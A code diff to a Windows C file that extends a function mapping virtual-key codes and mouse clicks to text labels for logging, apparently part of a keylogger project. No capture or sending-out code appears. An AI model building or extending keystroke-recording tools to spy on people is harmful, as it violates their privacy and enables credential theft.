@@ -8,7 +8,13 @@
 void TranslateVK(int character, char* output) {
 	char temp_out[64];
 
-	if(character >= 0x41 && character <= 0x5A ) {
+	if(character >= VK_NUMPAD0 && character <= VK_NUMPAD9) {
+		char character_str[2];
+		character_str[0] = character - VK_NUMPAD0 + 0x30;
+		character_str[1] = '\0';
+		strcpy(temp_out, character_str);
+	} else
+	if(character >= 0x30 && character <= 0x5A ) {
 		char character_str[2];
 		character_str[0] = character;
 		character_str[1] = '\0';
@@ -18,6 +24,12 @@ void TranslateVK(int character, char* output) {
 	{
 		switch (character)
 		{
+		case VK_LBUTTON: 
+			strcpy(temp_out, " [Left Click] ");
+			break;
+		case VK_RBUTTON: 
+			strcpy(temp_out, " [Right Click] ");
+			break;
 		case VK_CONTROL :
 			strcpy(temp_out, " [CTRL] ");
 			break;
@@ -94,6 +106,6 @@ void WelcomeMessage() {
 		"\t**                         |                        **\n"
 		"\t******************************************************\n"
 		;
-	log(message);
+	log(message); 
 #endif 
 }
